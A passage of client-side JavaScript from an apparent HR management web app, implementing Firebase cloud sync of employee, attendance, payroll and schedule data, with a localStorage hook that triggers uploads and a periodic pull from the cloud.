            const basePath = `stores/${encodeURIComponent(storeSlug)}`;
            console.log('[HRM sync] Reading cloud snapshot from', basePath);
            const segments = ['meta', 'employees', 'attendance', 'payroll', 'schedules', 'notes'];
            const chunkValues = await Promise.all(segments.map(async (segment) => {
                const dbRef = firebaseApi.ref(firebaseApi.database, `${basePath}/${segment}`);
                const snapshot = await firebaseApi.get(dbRef);
                return snapshot && typeof snapshot.val === 'function' ? snapshot.val() : null;
            }));
            const [metaChunk, employeesChunk, attendanceChunk, payrollChunk, schedulesChunk, notesChunk] = chunkValues;
            const combined = {
                store: (metaChunk && metaChunk.store) || (metaChunk && metaChunk.data && metaChunk.data.storeName) || '',
                storeSlug: (metaChunk && metaChunk.storeSlug) || getStoreSlug(),
                timestamp: (metaChunk && metaChunk.timestamp) || new Date().toISOString(),
                employees: unwrapCloudSegment(employeesChunk) || [],
                attendanceByMonth: unwrapCloudSegment(attendanceChunk) || {},
                payrollInputs: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).payrollInputs) || {},
                payrollData: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).payrollData) || {},
                salaryExtrasByEmpMonth: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).salaryExtrasByEmpMonth) || {},
                tcByEmpMonth: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).tcByEmpMonth) || {},
                revenueByEmpByMonth: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).revenueByEmpByMonth) || {},
                manualSalaryEdits: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).manualSalaryEdits) || {},
                salaryReportColToggles: (unwrapCloudSegment(payrollChunk) && unwrapCloudSegment(payrollChunk).salaryReportColToggles) || {},
                notes: unwrapCloudSegment(notesChunk) || {},
                workSchedules: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).workSchedules) || {},
                scheduleShiftsByMonth: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).scheduleShiftsByMonth) || {},
                workScheduleWeekTemplate: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).workScheduleWeekTemplate) || {},
                workScheduleWeekNames: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).workScheduleWeekNames) || {},
                workDaysStd: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).workDaysStd) || '26',
                salaryPerDay: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).salaryPerDay) || '0',
                shiftsByEmp: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).shiftsByEmp) || {},
                shiftsByEmpByMonth: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).shiftsByEmpByMonth) || {},
                workDaysStdByEmp: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).workDaysStdByEmp) || {},
                salaryPerDayByEmp: (unwrapCloudSegment(schedulesChunk) && unwrapCloudSegment(schedulesChunk).salaryPerDayByEmp) || {},
                storeName: (metaChunk && metaChunk.data && metaChunk.data.storeName) || (metaChunk && metaChunk.store) || ''
            };
            if (combined && Object.keys(combined).length > 0) {
                console.log('[HRM sync] Cloud snapshot loaded', { basePath, timestamp: combined.timestamp, storeSlug: combined.storeSlug });
                return combined;
            }
        } catch (err) {
            if (cfg.endpoint) {
                try {
                    const response = await fetch(cfg.endpoint, { method: 'GET' });
                    if (response.ok) return await response.json();
                } catch (fallbackErr) {
                    console.warn('Cloud read fallback failed.', fallbackErr);
                }
            }
        }
        return null;
    }

    async function syncFromCloud() {
        const cfg = getCloudSyncConfig();
        if (!cfg.enabled) return false;
        try {
            const remotePayload = await readSnapshotFromCloud();
            if (!remotePayload || Object.keys(remotePayload).length === 0) return false;
            window.__HRM_LAST_REMOTE_PAYLOAD__ = remotePayload;
            console.log('[HRM sync] Applying remote snapshot', { timestamp: remotePayload.timestamp, storeSlug: remotePayload.storeSlug, storeName: remotePayload.storeName });
            const remoteTimestamp = remotePayload.timestamp ? new Date(remotePayload.timestamp).getTime() : 0;
            const lastSeenTimestamp = Number(localStorage.getItem('cloudSyncLastRemoteTimestamp') || 0);
            const storedStoreSlug = String(localStorage.getItem('cloudSyncLastRemoteStore') || '');
            const currentStoreSlug = getStoreSlug();
            const shouldApply = !remoteTimestamp || !lastSeenTimestamp || remoteTimestamp >= lastSeenTimestamp || storedStoreSlug !== currentStoreSlug;
            if (!shouldApply) return false;
            const previousRemoteSyncFlag = window.__HRM_APPLYING_REMOTE_SYNC__;
            window.__HRM_APPLYING_REMOTE_SYNC__ = true;
            try {
                localStorage.setItem('cloudSyncLastRemoteTimestamp', String(remoteTimestamp || Date.now()));
                localStorage.setItem('cloudSyncLastRemoteStore', currentStoreSlug);
                importAllData(remotePayload, { source: 'cloud' });
                window.dispatchEvent(new Event('hrm:cloud-sync-applied'));
            } finally {
                window.__HRM_APPLYING_REMOTE_SYNC__ = previousRemoteSyncFlag;
            }
            return true;
        } catch (err) {
            console.warn('Cloud pull failed.', err);
            return false;
        }
    }

    async function uploadSnapshotToCloud() {
        const cfg = getCloudSyncConfig();
        if (!cfg.enabled) return false;
        if (cloudSyncInProgress) return false;
        cloudSyncInProgress = true;
        skipNextSyncTrigger = true;
        try {
            const payload = cloneDataForCloud();
            const currentStoreSlug = getStoreSlug();
            const previousStoreSlug = localStorage.getItem('cloudStoreSlug');
            if (previousStoreSlug !== currentStoreSlug) {
                localStorage.setItem('cloudStoreSlug', currentStoreSlug);
            }
            const firebaseApi = await ensureFirebaseReady();
            const basePath = `stores/${encodeURIComponent(currentStoreSlug)}`;
            const writes = Object.keys(payload).map(async (segment) => {
                const dbRef = firebaseApi.ref(firebaseApi.database, `${basePath}/${segment}`);
                await firebaseApi.set(dbRef, payload[segment]);
            });
            await Promise.all(writes);
            localStorage.setItem('cloudSyncLastSuccess', new Date().toISOString());
            return true;
        } catch (err) {
            if (cfg.endpoint) {
                try {
                    const response = await fetch(cfg.endpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (response.ok) {
                        localStorage.setItem('cloudSyncLastSuccess', new Date().toISOString());
                        return true;
                    }
                } catch (fallbackErr) {
                    console.warn('Firebase fallback sync failed.', fallbackErr);
                }
            }
            throw err;
        } finally {
            cloudSyncInProgress = false;
            skipNextSyncTrigger = false;
        }
    }

    function scheduleCloudSync() {
        const cfg = getCloudSyncConfig();
        if (!cfg.enabled) return;
        if (cloudSyncTimer) clearTimeout(cloudSyncTimer);
        cloudSyncTimer = setTimeout(() => {
            if (!cloudSyncPromise && !cloudSyncInProgress) {
                cloudSyncPromise = uploadSnapshotToCloud().catch(err => {
                    console.warn('HRM cloud sync error:', err);
                    localStorage.setItem('cloudSyncLastError', String(err && err.message ? err.message : err));
                    return false;
                }).finally(() => {
                    cloudSyncPromise = null;
                });
            }
        }, 900);
    }

    function installStorageSyncHook() {
        if (window[STORAGE_SYNC_HOOK_KEY]) return;
        window[STORAGE_SYNC_HOOK_KEY] = true;

        const storageInstance = window.localStorage;
        const originalSetItem = storageInstance.setItem.bind(storageInstance);
        const originalRemoveItem = storageInstance.removeItem.bind(storageInstance);
        const originalClear = storageInstance.clear.bind(storageInstance);

        Storage.prototype.setItem = function(key, value) {
            const strValue = String(value);
            const skipKey = ['sync_data_trigger', 'cloudSyncLastSuccess', 'cloudSyncLastError', 'cloudStoreSlug', 'firebaseSyncEnabled', 'cloudSyncEnabled'].includes(String(key));
            const suppressUpload = Boolean(window.__HRM_APPLYING_REMOTE_SYNC__) || cloudSyncInProgress || skipNextSyncTrigger || skipKey;
            originalSetItem.call(this, key, strValue);
            if (!suppressUpload && !skipKey) {
                scheduleCloudSync();
            }
            if (skipNextSyncTrigger) {
                skipNextSyncTrigger = false;
            }
        };

        Storage.prototype.removeItem = function(key) {
            const skipKey = ['sync_data_trigger', 'cloudSyncLastSuccess', 'cloudSyncLastError', 'cloudStoreSlug', 'firebaseSyncEnabled', 'cloudSyncEnabled'].includes(String(key));
            const suppressUpload = Boolean(window.__HRM_APPLYING_REMOTE_SYNC__) || cloudSyncInProgress || skipNextSyncTrigger || skipKey;
            originalRemoveItem.call(this, key);
            if (!suppressUpload && !skipKey) {
                scheduleCloudSync();
            }
            if (skipNextSyncTrigger) {
                skipNextSyncTrigger = false;
            }
        };

        Storage.prototype.clear = function() {
            const suppressUpload = Boolean(window.__HRM_APPLYING_REMOTE_SYNC__) || cloudSyncInProgress || skipNextSyncTrigger;
            originalClear.call(this);
            if (!suppressUpload) {
                scheduleCloudSync();
            }
            if (skipNextSyncTrigger) {
                skipNextSyncTrigger = false;
            }
        };
    }

    installStorageSyncHook();

    window.addEventListener('DOMContentLoaded', function () {
        const cfg = getCloudSyncConfig();
        if (cfg.enabled) {
            localStorage.setItem('firebaseSyncEnabled', '1');
            localStorage.setItem('cloudSyncEnabled', '1');
            scheduleCloudSync();
            setTimeout(async () => {
                try {
                    await syncFromCloud();
                } catch (err) {}
                try {
                    await uploadSnapshotToCloud();
                } catch (err) {}
            }, 800);
            if (!window.__HRM_CLOUD_PULL_INTERVAL__) {
                window.__HRM_CLOUD_PULL_INTERVAL__ = window.setInterval(async () => {
                    try {
                        await syncFromCloud();
                    } catch (err) {}
                    try {
                        await uploadSnapshotToCloud();
                    } catch (err) {}
                }, 12000);
            }
        }
    });

    window.syncAllDataToCloud = async function () {
        console.log('[HRM sync] Disabled');
        return { pullResult: false, pushResult: false };
    };

    window.syncDataFromCloud = function () {
        console.log('[HRM sync] Disabled');
        return false;
    };
})();
